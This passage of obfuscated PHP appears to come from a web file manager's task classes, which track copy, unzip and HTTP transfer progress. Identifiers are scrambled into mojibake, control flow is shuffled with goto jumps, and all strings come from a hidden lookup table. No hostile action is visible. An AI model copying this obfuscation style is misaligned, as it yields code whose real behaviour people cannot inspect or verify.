self::parse($Dİ‹˜‹×’ó); if ($dÏ‡¿«°…[$cèÖË¡“ƒ„[29]] !== self::KOD_SOURCE) { show_json(LNG($cèÖË¡“ƒ„[1067]), !1); } return $dÏ‡¿«°…[$cèÖË¡“ƒ„[363]]; } public static function make($EÊí´ÍÑ£×) { if (!$EÊí´ÍÑ£×) { return !1; } return self::makePath(self::KOD_SOURCE, intval($EÊí´ÍÑ£×)); } public static function makeShare($FÑ¦ âô, $B’§¾Å‚é) { return self::makePath(self::KOD_SHARE_ITEM, $FÑ¦ âô, $B’§¾Å‚é); } public static function makeFileTypePath($EÔ§ßëÅ±í) { return self::makePath(self::KOD_USER_FILE_TYPE, $EÔ§ßëÅ±í); } public static function makeFileTagPath($aĞÍÏ¿òĞÚ) { return self::makePath(self::KOD_USER_FILE_TAG, $aĞÍÏ¿òĞÚ); } public static function makePath($Dåöµ·ø…Ü, $A‚í¹‹¿Ö = '', $eñÍµÕ–ƒß = '') { $bêÜïƒ„‘Ï =& $_SERVER[Ö]; $bÃœÓ¼Å§« = substr($Dåöµ·ø…Ü, 1, -1); $FÕ´ÃÊÒÒî = $bêÜïƒ„‘Ï[1068] . $bÃœÓ¼Å§« . $bêÜïƒ„‘Ï[1069] . $A‚í¹‹¿Ö . $bêÜïƒ„‘Ï[1070]; $FÕ´ÃÊÒÒî = $eñÍµÕ–ƒß ? $FÕ´ÃÊÒÒî . $eñÍµÕ–ƒß . $bêÜïƒ„‘Ï[8] : $FÕ´ÃÊÒÒî; return $FÕ´ÃÊÒÒî; } public static function hashPath($cíÊÔ¹µ…ˆ) { $C‘ë‹ÇÏà =& $_SERVER[Ö]; $DÅÛ”á…‡ = is_array($cíÊÔ¹µ…ˆ) ? $cíÊÔ¹µ…ˆ : IO::info($cíÊÔ¹µ…ˆ); $e·•Èí Ô‘ = _get($DÅÛ”á…‡, $C‘ë‹ÇÏà[1071], $C‘ë‹ÇÏà[33]); if (!$e·•Èí Ô‘) { $cï‡é¸„Ô = KodIO::parse($DÅÛ”á…‡[$C‘ë‹ÇÏà[75]]); if (!$cï‡é¸„Ô[$C‘ë‹ÇÏà[29]]) { $e·•Èí Ô‘ = IO::hashSimple($DÅÛ”á…‡[$C‘ë‹ÇÏà[75]]); } } if (!$e·•Èí Ô‘) { $e·•Èí Ô‘ = md5($DÅÛ”á…‡[$C‘ë‹ÇÏà[75]] . $DÅÛ”á…‡[$C‘ë‹ÇÏà[77]] . $DÅÛ”á…‡[$C‘ë‹ÇÏà[106]]); } return $e·•Èí Ô‘; } public static function initSystemPath() { $eß„ŠŠó×ù =& $_SERVER[Ö]; if (defined($eß„ŠŠó×ù[1072])) { return; } define($eß„ŠŠó×ù[1072], self::systemPath($eß„ŠŠó×ù[1073])); define($eß„ŠŠó×ù[1074], self::systemPath($eß„ŠŠó×ù[1075])); define($eß„ŠŠó×ù[1076], self::systemPath($eß„ŠŠó×ù[1077])); define($eß„ŠŠó×ù[1078], self::systemPath($eß„ŠŠó×ù[1079])); } private static function systemPath($fÑÍïÃ¦øÌ) { goto EœŞè°ßã; EœŞè°ßã: $fÑ††°Äø« =& $_SERVER[Ö]; $AÑ¿ÆŠ¯…‰ = $fÑ††°Äø«[1080] . ucfirst($fÑÍïÃ¦øÌ); $dĞ¬±ğ†Ò‚ = Model($fÑ††°Äø«[1081])->get($AÑ¿ÆŠ¯…‰); goto CàÇ˜Áßµ; BÃ×Ñ«…ëÌ: return $dĞ¬±ğ†Ò‚; goto EÖÍÙÒ›Ğ; CàÇ˜Áßµ: if ($dĞ¬±ğ†Ò‚) { return $dĞ¬±ğ†Ò‚; } if ($fÑÍïÃ¦øÌ == $fÑ††°Äø«[1073]) { $dĞ¬±ğ†Ò‚ = self::make(Model($fÑ††°Äø«[745])->systemRootPathAdd($fÑ††°Äø«[1082])); } else { $dĞ¬±ğ†Ò‚ = self::systemPath($fÑ††°Äø«[1073]); $câ¦¦ØÉ¿Ÿ = self::sourceID($dĞ¬±ğ†Ò‚); $dĞ¬±ğ†Ò‚ = self::make(Model($fÑ††°Äø«[745])->mkdir($câ¦¦ØÉ¿Ÿ, $fÑÍïÃ¦øÌ)); } Model($fÑ††°Äø«[1081])->set($AÑ¿ÆŠ¯…‰, $dĞ¬±ğ†Ò‚); goto BÃ×Ñ«…ëÌ; EÖÍÙÒ›Ğ: } public static function systemFolder($DÖ§å‘‘Ò™) { $EÒ¥Øæô = IO_PATH_SYSTEM_SOURCE . $DÖ§å‘‘Ò™; $f¡ñ²Ô¼òÅ = Cache::get($EÒ¥Øæô); if (!$f¡ñ²Ô¼òÅ) { $fèí™ƒ²åŠ = IO::infoFull($EÒ¥Øæô); if (!$fèí™ƒ²åŠ) { $f¡ñ²Ô¼òÅ = IO::mkdir($EÒ¥Øæô, REPEAT_SKIP); } else { $f¡ñ²Ô¼òÅ = $fèí™ƒ²åŠ[$_SERVER[Ö][75]]; } Cache::set($EÒ¥Øæô, $f¡ñ²Ô¼òÅ, 3600 * 10); } return $f¡ñ²Ô¼òÅ; } public static function defaultDriver() { return Model($_SERVER[Ö][697])->defaultDriver(); } public static function defaultIO() { $bïœÃæĞ×Ú =& $_SERVER[Ö]; $d—Û“Ù´ÃÜ = self::defaultDriver(); return $bïœÃæĞ×Ú[1083] . $d—Û“Ù´ÃÜ[$bïœÃæĞ×Ú[363]] . $bïœÃæĞ×Ú[1070]; } public static function fileTypeList() { $CîÚîÏó…É =& $_SERVER[Ö]; $b¥™„ê»Æ = $GLOBALS[$CîÚîÏó…É[6]][$CîÚîÏó…É[1084]]; foreach ($b¥™„ê»Æ as $b›­„«è¬ó => $dùŠ¼ÍÏ—) { $f¨ùˆ ¡Òß = $CîÚîÏó…É[1085] . $b›­„«è¬ó; $A– Ü­µŸ• = LNG($f¨ùˆ ¡Òß); if ($f¨ùˆ ¡Òß != $A– Ü­µŸ•) { $b¥™„ê»Æ[$b›­„«è¬ó][$CîÚîÏó…É[28]] = $A– Ü­µŸ•; } } return $b¥™„ê»Æ; } } goto E®Ç¬¯æ²È; AïÆ¹×¦ƒ: class TaskFileTransfer extends Task { protected function startAfter() { goto c¯—×ñ¯©‘; eáÕÊä¡Ø‚: Hook::bind($fÎè÷Ìö´[1451], array($this, $fÎè÷Ìö´[1452])); Hook::bind($fÎè÷Ìö´[1453], array($this, $fÎè÷Ìö´[1454])); Hook::bind($fÎè÷Ìö´[1455], array($this, $fÎè÷Ìö´[1456])); goto c¦œÙôËöì; A¬³µ–: Hook::bind($fÎè÷Ìö´[1438], array($this, $fÎè÷Ìö´[1439])); Hook::bind($fÎè÷Ìö´[1440], array($this, $fÎè÷Ìö´[1441])); Hook::bind($fÎè÷Ìö´[1442], array($this, $fÎè÷Ìö´[1443])); goto BÍ¯³Æ“ä·; D…Óñ¤šÄ : if (!$f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[1320]]) { $f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[1320]] = LNG($fÎè÷Ìö´[1463]); } goto b‰Ã‡‚äÌ; D‘§°£õîĞ: Hook::bind($fÎè÷Ìö´[539], array($this, $fÎè÷Ìö´[1446])); Hook::bind($fÎè÷Ìö´[505], array($this, $fÎè÷Ìö´[1447])); Hook::bind($fÎè÷Ìö´[502], array($this, $fÎè÷Ìö´[1447])); goto b‰ ŞŒÍ¦Â; BÍ¯³Æ“ä·: Hook::bind($fÎè÷Ìö´[535], array($this, $fÎè÷Ìö´[1444])); Hook::bind($fÎè÷Ìö´[536], array($this, $fÎè÷Ìö´[1445])); Hook::bind($fÎè÷Ìö´[538], array($this, $fÎè÷Ìö´[1446])); goto D‘§°£õîĞ; EóÛ…¥ˆøï: Hook::bind($fÎè÷Ìö´[1448], array($this, $fÎè÷Ìö´[1449])); Hook::bind($fÎè÷Ìö´[528], array($this, $fÎè÷Ìö´[1450])); $this->sourceModelCopyFlag = !1; goto eáÕÊä¡Ø‚; c¦œÙôËöì: $f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[1457]] = LNG($fÎè÷Ìö´[1458]); $f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[1459]] = 0; $f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[1460]] = 0; goto e—ØÖÍ±§Ş; e—ØÖÍ±§Ş: $f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[973]] = $fÎè÷Ìö´[33]; $f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[1461]] = $fÎè÷Ìö´[33]; $f…½ÙĞ˜˜Ÿ[$fÎè÷Ìö´[1462]] = 0; goto D…Óñ¤šÄ ; b‰ ŞŒÍ¦Â: Hook::bind($fÎè÷Ìö´[507], array($this, $fÎè÷Ìö´[1447])); Hook::bind($fÎè÷Ìö´[509], array($this, $fÎè÷Ìö´[1447])); Hook::bind($fÎè÷Ìö´[511], array($this, $fÎè÷Ìö´[1447])); goto EóÛ…¥ˆøï; c¯—×ñ¯©‘: $fÎè÷Ìö´ =& $_SERVER[Ö]; $f…½ÙĞ˜˜Ÿ =& $this->task; $this->sourceCopyFolder = !1; goto A¬³µ–; b‰Ã‡‚äÌ: } protected function endAfter() { goto böÙæ ä‘¦; b‚×áÁõî˜: Hook::unbind($e’‘÷´§Üµ[502], array($this, $e’‘÷´§Üµ[1447])); Hook::unbind($e’‘÷´§Üµ[507], array($this, $e’‘÷´§Üµ[1447])); Hook::unbind($e’‘÷´§Üµ[509], array($this, $e’‘÷´§Üµ[1447])); goto c ‡ÚÆÌ¥; cİà…½£Ë: Hook::unbind($e’‘÷´§Üµ[1451], array($this, $e’‘÷´§Üµ[1452])); Hook::unbind($e’‘÷´§Üµ[1453], array($this, $e’‘÷´§Üµ[1454])); Hook::unbind($e’‘÷´§Üµ[1455], array($this, $e’‘÷´§Üµ[1456])); goto B…¼ Ô§; d“Æ›õÀ É: Hook::unbind($e’‘÷´§Üµ[1442], array($this, $e’‘÷´§Üµ[1443])); Hook::unbind($e’‘÷´§Üµ[535], array($this, $e’‘÷´§Üµ[1444])); Hook::unbind($e’‘÷´§Üµ[536], array($this, $e’‘÷´§Üµ[1445])); goto AË¤Ùª¢­œ; c ‡ÚÆÌ¥: Hook::unbind($e’‘÷´§Üµ[511], array($this, $e’‘÷´§Üµ[1447])); Hook::unbind($e’‘÷´§Üµ[1448], array($this, $e’‘÷´§Üµ[1449])); Hook::unbind($e’‘÷´§Üµ[528], array($this, $e’‘÷´§Üµ[1450])); goto cİà…½£Ë; AË¤Ùª¢­œ: Hook::unbind($e’‘÷´§Üµ[538], array($this, $e’‘÷´§Üµ[1446])); Hook::unbind($e’‘÷´§Üµ[539], array($this, $e’‘÷´§Üµ[1446])); Hook::unbind($e’‘÷´§Üµ[505], array($this, $e’‘÷´§Üµ[1447])); goto b‚×áÁõî˜; böÙæ ä‘¦: $e’‘÷´§Üµ =& $_SERVER[Ö]; Hook::unbind($e’‘÷´§Üµ[1438], array($this, $e’‘÷´§Üµ[1439])); Hook::unbind($e’‘÷´§Üµ[1440], array($this, $e’‘÷´§Üµ[1441])); goto d“Æ›õÀ É; B…¼ Ô§: } public function copyMoveStart($eÔ…˜ôŸ¥Ğ, $BÏ§Ò®·È, $fµ™éäº®’, $CŒ¸†®ö¹©) { } public function updateAfter() { goto DÛïã¾©åÍ; c³¼×¢’œ´: if ($this->sourceModelCopyFlag) { return; } $Dä§Ú·‰è” = 0; if ($d¡òÜÓÖ¹[$b¼©‘˜œà[1461]] == $b¼©‘˜œà[1033]) { $Dä§Ú·‰è” = $d¡òÜÓÖ¹[$b¼©‘˜œà[1460]] * 0.5; } else { if ($d¡òÜÓÖ¹[$b¼©‘˜œà[1461]] == $b¼©‘˜œà[102]) { $Dä§Ú·‰è” = $d¡òÜÓÖ¹[$b¼©‘˜œà[1460]] * 0.5 + $d¡òÜÓÖ¹[$b¼©‘˜œà[1459]] * 0.5; } } goto EÊ°á‚Äé¢; EÊ°á‚Äé¢: $d¡òÜÓÖ¹[$b¼©‘˜œà[1415]] = ($d¡òÜÓÖ¹[$b¼©‘˜œà[1464]] + $Dä§Ú·‰è”) / $d¡òÜÓÖ¹[$b¼©‘˜œà[691]]; if ($d¡òÜÓÖ¹[$b¼©‘˜œà[1415]] > 0) { $bŸ÷‚ŞæÂ† = timeFloat() - $d¡òÜÓÖ¹[$b¼©‘˜œà[1417]] - $d¡òÜÓÖ¹[$b¼©‘˜œà[1420]]; $d¡òÜÓÖ¹[$b¼©‘˜œà[1421]] = $bŸ÷‚ŞæÂ† * (1 - $d¡òÜÓÖ¹[$b¼©‘˜œà[1415]]) / $d¡òÜÓÖ¹[$b¼©‘˜œà[1415]]; } goto f­Ó“‘‰¹˜; DÛïã¾©åÍ: $b¼©‘˜œà =& $_SERVER[Ö]; $d¡òÜÓÖ¹ =& $this->task; if (!$d¡òÜÓÖ¹[$b¼©‘˜œà[691]]) { return; } goto c³¼×¢’œ´; f­Ó“‘‰¹˜: } public function addPath($F¦¡ˆÂ°å) { goto eÁ„›Äù¥; eÁ„›Äù¥: $F‚¤ò³ïâª =& $_SERVER[Ö]; if (!$F¦¡ˆÂ°å) { return; } $fñÕâÒÑ† =& $this->task; goto dó»ßæ®Í“; dó»ßæ®Í“: $B÷ìì°ÈÅ¼ = IO::infoWithChildren($F¦¡ˆÂ°å); $D…íÈÛÀˆù = $fñÕâÒÑ†[$F‚¤ò³ïâª[1465]] ? $fñÕâÒÑ†[$F‚¤ò³ïâª[1465]][$F‚¤ò³ïâª[1466]] : 0; $fñÕâÒÑ†[$F‚¤ò³ïâª[1465]] = array($F‚¤ò³ïâª[1466] => $D…íÈÛÀˆù + 1, $F‚¤ò³ïâª[382] => $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[28]], $F‚¤ò³ïâª[75] => $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[75]], $F‚¤ò³ïâª[462] => $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[462]] ? $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[462]] : $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[75]]); goto BÜÂ‡Ü¬àë; BÜÂ‡Ü¬àë: if ($B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[29]] == $F‚¤ò³ïâª[163]) { $fñÕâÒÑ†[$F‚¤ò³ïâª[971]] += 1; } else { $fñÕâÒÑ†[$F‚¤ò³ïâª[971]] += $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[80]][$F‚¤ò³ïâª[78]]; if ($B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[365]]) { $fñÕâÒÑ†[$F‚¤ò³ïâª[971]] += $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[80]][$F‚¤ò³ïâª[79]] + 1; } } $fñÕâÒÑ†[$F‚¤ò³ïâª[691]] += $B÷ìì°ÈÅ¼[$F‚¤ò³ïâª[77]]; $this->update(); goto BÑß¥Ì¯¶; BÑß¥Ì¯¶: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($B§ì¡—Ê) { $EÛ²ˆô•° =& $_SERVER[Ö]; $C¡íˆä£™ö =& $this->task; $C¡íˆä£™ö[$EÛ²ˆô•°[1457]] = $B§ì¡—Ê[$EÛ²ˆô•°[28]]; $C¡íˆä£™ö[$EÛ²ˆô•°[973]] = $B§ì¡—Ê[$EÛ²ˆô•°[28]]; $this->update(); } public function copyFileStart($A÷ò¬º„Ö‰, $CÑÚ³ñÕÏ, $d‰çĞ²˜Ã¡, $fÓŒŒßÎÒË, $a÷Æ‡…å‡Ô, $D©áªÊË˜·) { goto b©ö·öÌ¨Ö; b©ö·öÌ¨Ö: $bÏº‰ÛˆêÂ =& $_SERVER[Ö]; $FÙÎ¡ËËÛ  = $a÷Æ‡…å‡Ô; if ($FÙÎ¡ËËÛ  == $GLOBALS[$bÏº‰ÛˆêÂ[1467]]) { $FÙÎ¡ËËÛ  = $GLOBALS[$bÏº‰ÛˆêÂ[1468]]; } goto c©´ÃÍàæ–; e„†÷©êÓ: $d÷ÊÒîŠì[$bÏº‰ÛˆêÂ[973]] = $bÏº‰ÛˆêÂ[33]; $d÷ÊÒîŠì[$bÏº‰ÛˆêÂ[1461]] = $bÏº‰ÛˆêÂ[33]; $d÷ÊÒîŠì[$bÏº‰ÛˆêÂ[1462]] = 0; goto d‘±Í•Î™º; FØÒµ÷Ûñ£: $d÷ÊÒîŠì[$bÏº‰ÛˆêÂ[1457]] = $FÙÎ¡ËËÛ ; $d÷ÊÒîŠì[$bÏº‰ÛˆêÂ[1459]] = (int) $A÷ò¬º„Ö‰->size($CÑÚ³ñÕÏ); $d÷ÊÒîŠì[$bÏº‰ÛˆêÂ[1460]] = 0; goto e„†÷©êÓ; c©´ÃÍàæ–: $GLOBALS[$bÏº‰ÛˆêÂ[1468]] = $a÷Æ‡…å‡Ô; $GLOBALS[$bÏº‰ÛˆêÂ[1467]] = $D©áªÊË˜·; $d÷ÊÒîŠì =& $this->task; goto FØÒµ÷Ûñ£; d‘±Í•Î™º: $this->update(); goto aƒÛšòÊ’; aƒÛšòÊ’: } public function copyFileEnd($b‘‹Ë×°ìí, $AºóŸñ­ÚĞ, $bñâë‡Ë, $C‡±¤Û¡êŠ, $Cæá„Áùí‹, $a­Œä™ÚÚ“) { $cÑ¹êù¢¬ =& $_SERVER[Ö]; $Eš÷ªŸÓ˜ô =& $this->task; $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1460]] = $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1459]]; $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1461]] = $cÑ¹êù¢¬[33]; if ($Cæá„Áùí‹ == $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1457]]) { $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1464]] += $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1459]]; $this->update(1); } else { $this->update(); $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1460]] = 0; } self::log($cÑ¹êù¢¬[1469] . $AºóŸñ­ÚĞ . $cÑ¹êù¢¬[66] . $C‡±¤Û¡êŠ . $cÑ¹êù¢¬[213] . $Cæá„Áùí‹ . $cÑ¹êù¢¬[1470] . $Eš÷ªŸÓ˜ô[$cÑ¹êù¢¬[1457]]); } public function updateFileEnd($c”­„¯ÀŠÏ, $d¤ÎŠÁŒ¸‹) { $CŠ”ÛëÂê¹ =& $_SERVER[Ö]; $B‰š¥Û š¥ =& $this->task; $B‰š¥Û š¥[$CŠ”ÛëÂê¹[1457]] = $c”­„¯ÀŠÏ; $B‰š¥Û š¥[$CŠ”ÛëÂê¹[1459]] = $d¤ÎŠÁŒ¸‹; $B‰š¥Û š¥[$CŠ”ÛëÂê¹[1464]] += $d¤ÎŠÁŒ¸‹; $this->update(1); } public function sourceModelCopy($b’è¾ñÆ¾ï) { goto a±´°†î·ó; f³Ú¦”…Øé: switch ($cÀá«É‹‡—) { case $eåé•íÃ‹ì[503]: $AíÁ“İ»ŸÊ = 1; break; case $eåé•íÃ‹ì[506]: $E²°«Š£ß[$eåé•íÃ‹ì[1457]] = $dÅ´××›î‰[$eåé•íÃ‹ì[28]]; break; case $eåé•íÃ‹ì[508]: $AíÁ“İ»ŸÊ = intval($b’è¾ñÆ¾ï[$eåé•íÃ‹ì[359]] * 0.4); break; case $eåé•íÃ‹ì[510]: $AíÁ“İ»ŸÊ = intval($b’è¾ñÆ¾ï[$eåé•íÃ‹ì[359]] * 0.2); break; case $eåé•íÃ‹ì[512]: $AíÁ“İ»ŸÊ = intval($b’è¾ñÆ¾ï[$eåé•íÃ‹ì[359]] * 0.4); break; } $this->update($AíÁ“İ»ŸÊ); $this->sourceModelCopyFlag = !1; goto c®†„¹•×å; a±´°†î·ó: $eåé•íÃ‹ì =& $_SERVER[Ö]; $cÀá«É‹‡— = $b’è¾ñÆ¾ï[0]; $dÅ´××›î‰ = $b’è¾ñÆ¾ï[1]; goto CùÉ÷«…‚‘; CùÉ÷«…‚‘: $E²°«Š£ß =& $this->task; $this->sourceModelCopyFlag = !0; $AíÁ“İ»ŸÊ = 0; goto f³Ú¦”…Øé; c®†„¹•×å: } public function sourceRemove($c«‹ÙÎê, $e„¢ª¶ÊŠ‡) { $Aâ©‹í‚–® =& $_SERVER[Ö]; $this->sourceModelCopyFlag = !0; $fö”Û¦”Í’ = 1; if (isset($c«‹ÙÎê[$Aâ©‹í‚–®[80]])) { $fö”Û¦”Í’ = $c«‹ÙÎê[$Aâ©‹í‚–®[80]][$Aâ©‹í‚–®[78]] + $c«‹ÙÎê[$Aâ©‹í‚–®[80]][$Aâ©‹í‚–®[79]] + 1; } $this->update($fö”Û¦”Í’); $this->sourceModelCopyFlag = !1; } public function sourceMove($dˆºñ³’›ê) { $this->sourceRemove($dˆºñ³’›ê, !1); } public function curlProgress($FšôÙƒ¢¤—, $d¤²’ïâÄô, $fÂÄâ§˜Öà, $BŠ²µğÚàÕ, $eÏ“â«Ã) { $EˆÄÁ†»É§ =& $_SERVER[Ö]; $F õ¯»µ—Û =& $this->task; if ($eÏ“â«Ã > 0) { $F õ¯»µ—Û[$EˆÄÁ†»É§[973]] = $EˆÄÁ†»É§[1471]; $F õ¯»µ—Û[$EˆÄÁ†»É§[1461]] = $EˆÄÁ†»É§[102]; if ($F õ¯»µ—Û[$EˆÄÁ†»É§[1459]] == $BŠ²µğÚàÕ || $BŠ²µğÚàÕ > 1024 * 1024) { $F õ¯»µ—Û[$EˆÄÁ†»É§[1460]] = $eÏ“â«Ã; } if ($F õ¯»µ—Û[$EˆÄÁ†»É§[1462]]) { $F õ¯»µ—Û[$EˆÄÁ†»É§[1460]] = $eÏ“â«Ã + $F õ¯»µ—Û[$EˆÄÁ†»É§[1462]]; } } else { if ($fÂÄâ§˜Öà > 0) { if ($F õ¯»µ—Û[$EˆÄÁ†»É§[1459]] == $d¤²’ïâÄô) { $F õ¯»µ—Û[$EˆÄÁ†»É§[1460]] = $fÂÄâ§˜Öà; $F õ¯»µ—Û[$EˆÄÁ†»É§[973]] = $EˆÄÁ†»É§[1472]; $F õ¯»µ—Û[$EˆÄÁ†»É§[1461]] = $EˆÄÁ†»É§[1033]; } } } $this->update(); } public function curlProgressStart($aÈÜË‘•°) { } public function curlProgressEnd($DŒ­¡Ê˜»Ö) { $EÃ¶ñÎ¼Û‹ =& $_SERVER[Ö]; $d¾ìæãñ™ˆ =& $this->task; $fÔÛØ¼®®² = curl_getinfo($DŒ­¡Ê˜»Ö); $AŒÌŒÄÏ…— = $fÔÛØ¼®®²[$EÃ¶ñÎ¼Û‹[1473]]; if ($d¾ìæãñ™ˆ[$EÃ¶ñÎ¼Û‹[1461]] == $EÃ¶ñÎ¼Û‹[102] && $AŒÌŒÄÏ…—) { $d¾ìæãñ™ˆ[$EÃ¶ñÎ¼Û‹[1462]] += $AŒÌŒÄÏ…—; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $c´¯ªî»õë =& $_SERVER[Ö]; Hook::bind($c´¯ªî»õë[1451], array($this, $c´¯ªî»õë[1474])); Hook::bind($c´¯ªî»õë[1453], array($this, $c´¯ªî»õë[1475])); Hook::bind($c´¯ªî»õë[1455], array($this, $c´¯ªî»õë[1476])); } protected function endAfter() { $eùó¿ìí =& $_SERVER[Ö]; Hook::unbind($eùó¿ìí[1451], array($this, $eùó¿ìí[1474])); Hook::unbind($eùó¿ìí[1453], array($this, $eùó¿ìí[1475])); Hook::unbind($eùó¿ìí[1455], array($this, $eùó¿ìí[1476])); } public function progressStart($a¨Éİ÷É) { $B£±İÂ‘”Å =& $_SERVER[Ö]; $B¹ŒÚŞÏƒ¦ = curl_getinfo($a¨Éİ÷É); self::log($B£±İÂ‘”Å[1477] . $B¹ŒÚŞÏƒ¦[$B£±İÂ‘”Å[291]]); self::valueSet($this->task[$B£±İÂ‘”Å[363]], $this->task); } public function progressEnd($F™­Ä©´ƒ) { $c†İäµáß =& $_SERVER[Ö]; self::log($c†İäµáß[1478] . $this->task[$c†İäµáß[363]]); $this->end(); } public function progress($d‹¯´±¹, $a‡ÎôÅ¾ù, $CéÊëˆÀ«Á, $fØºêÕÌª×, $AÌù¥ƒõè¢) { $A¶­èå =& $_SERVER[Ö]; $B‹Èñ¾ëøˆ =& $this->task; if ($AÌù¥ƒõè¢ > 0) { $B‹Èñ¾ëøˆ[$A¶­èå[971]] = $B‹Èñ¾ëøˆ[$A¶­èå[971]] == 0 ? $fØºêÕÌª× : $B‹Èñ¾ëøˆ[$A¶­èå[971]]; $B‹Èñ¾ëøˆ[$A¶­èå[983]] = $AÌù¥ƒõè¢; } else { if ($CéÊëˆÀ«Á > 0) { $B‹Èñ¾ëøˆ[$A¶­èå[971]] = $B‹Èñ¾ëøˆ[$A¶­èå[971]] == 0 ? $a‡ÎôÅ¾ù : $B‹Èñ¾ëøˆ[$A¶­èå[971]]; $B‹Èñ¾ëøˆ[$A¶­èå[983]] = $CéÊëˆÀ«Á; } } $this->update(); self::log("\x70\162\157\x67\x72\x65\163\x73\110\x74\x74\160\72\x64\157\167\x6e\x3a{$CéÊëˆÀ«Á}\57{$a‡ÎôÅ¾ù}\73\x20\165\160\154\157\x61\144\x3a{$AÌù¥ƒõè¢}\57{$fØºêÕÌª×}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto c•×ì‰Œ´«; Eº÷‹ê·íõ: Hook::bind($f •£‚íã‰[1028], array($this, $f •£‚íã‰[1481])); $b¼Ö‡„ÖÊ… =& $this->task; $b¼Ö‡„ÖÊ…[$f •£‚íã‰[1482]] = $f •£‚íã‰[1033]; goto FÜÈ±ìã…ø; FÜÈ±ìã…ø: if (!$b¼Ö‡„ÖÊ…[$f •£‚íã‰[1320]]) { $b¼Ö‡„ÖÊ…[$f •£‚íã‰[1320]] = LNG($f •£‚íã‰[1483]); } goto fÄº‚µç©; c•×ì‰Œ´«: $f •£‚íã‰ =& $_SERVER[Ö]; parent::startAfter(); Hook::bind($f •£‚íã‰[1479], array($this, $f •£‚íã‰[1480])); goto Eº÷‹ê·íõ; fÄº‚µç©: } protected function endAfter() { $c æé°¯Â³ =& $_SERVER[Ö]; parent::endAfter(); Hook::unbind($c æé°¯Â³[1479], array($this, $c æé°¯Â³[1480])); Hook::unbind($c æé°¯Â³[1028], array($this, $c æé°¯Â³[1481])); } public function updateAfter() { $CŸ·ßÖö³À =& $_SERVER[Ö]; $EÑÇéŠàÆ =& $this->task; if (!$EÑÇéŠàÆ[$CŸ·ßÖö³À[971]] || !$EÑÇéŠàÆ[$CŸ·ßÖö³À[691]]) { return; } if ($EÑÇéŠàÆ[$CŸ·ßÖö³À[1482]] == $CŸ·ßÖö³À[1033]) { $c„ªî¼Û¾² = 0; if ($EÑÇéŠàÆ[$CŸ·ßÖö³À[1459]]) { $c„ªî¼Û¾² = $EÑÇéŠàÆ[$CŸ·ßÖö³À[1460]] / $EÑÇéŠàÆ[$CŸ·ßÖö³À[1459]]; } $EÑÇéŠàÆ[$CŸ·ßÖö³À[1415]] = $c„ªî¼Û¾² * 0.3; } else { if ($EÑÇéŠàÆ[$CŸ·ßÖö³À[1482]] == $CŸ·ßÖö³À[297]) { $c„ªî¼Û¾² = $EÑÇéŠàÆ[$CŸ·ßÖö³À[983]] / $EÑÇéŠàÆ[$CŸ·ßÖö³À[971]]; $EÑÇéŠàÆ[$CŸ·ßÖö³À[1415]] = 0.3 + $c„ªî¼Û¾² * 0.4; } else { if ($EÑÇéŠàÆ[$CŸ·ßÖö³À[1482]] == $CŸ·ßÖö³À[102]) { $E¹Ñ‘‰­ª© = 0; if ($EÑÇéŠàÆ[$CŸ·ßÖö³À[1461]] == $CŸ·ßÖö³À[102]) { $E¹Ñ‘‰­ª© = $EÑÇéŠàÆ[$CŸ·ßÖö³À[1460]]; } $c„ªî¼Û¾² = ($EÑÇéŠàÆ[$CŸ·ßÖö³À[1464]] + $E¹Ñ‘‰­ª©) / $EÑÇéŠàÆ[$CŸ·ßÖö³À[691]]; $EÑÇéŠàÆ[$CŸ·ßÖö³À[1415]] = 0.3 + 0.4 + $c„ªî¼Û¾² * 0.3; } } } if ($EÑÇéŠàÆ[$CŸ·ßÖö³À[1415]] > 0) { $aÜŞÂ‹ñ«¢ = timeFloat() - $EÑÇéŠàÆ[$CŸ·ßÖö³À[1417]] - $EÑÇéŠàÆ[$CŸ·ßÖö³À[1420]]; $EÑÇéŠàÆ[$CŸ·ßÖö³À[1421]] = $aÜŞÂ‹ñ«¢ * (1 - $EÑÇéŠàÆ[$CŸ·ßÖö³À[1415]]) / $EÑÇéŠàÆ[$CŸ·ßÖö³À[1415]]; } } public function addFile($Bô¶òÄ‹á) { goto Bë³ÂèÏ†ˆ; aéğ«ïœÒŒ: $C¢é©¿†»¬[$aŞØ’İ­­”[1457]] = $e¥·¤Ñ•„ß[$aŞØ’İ­­”[28]]; $C¢é©¿†»¬[$aŞØ’İ­­”[1459]] = $e¥·¤Ñ•„ß[$aŞØ’İ­­”[77]]; $C¢é©¿†»¬[$aŞØ’İ­­”[1460]] = 0; goto Eø·±²¾ì×; b½¼¶‘‹…Š: $this->update(); goto Eèí¥Ûùõó; Eø·±²¾ì×: $C¢é©¿†»¬[$aŞØ’İ­­”[973]] = $aŞØ’İ­­”[1472]; $C¢é©¿†»¬[$aŞØ’İ­­”[1461]] = $aŞØ’İ­­”[1033]; $C¢é©¿†»¬[$aŞØ’İ­­”[691]] = $e¥·¤Ñ•„ß[$aŞØ’İ­­”[77]]; goto FæÜ«á‘ª; FæÜ«á‘ª: $C¢é©¿†»¬[$aŞØ’İ­­”[971]] = 1; 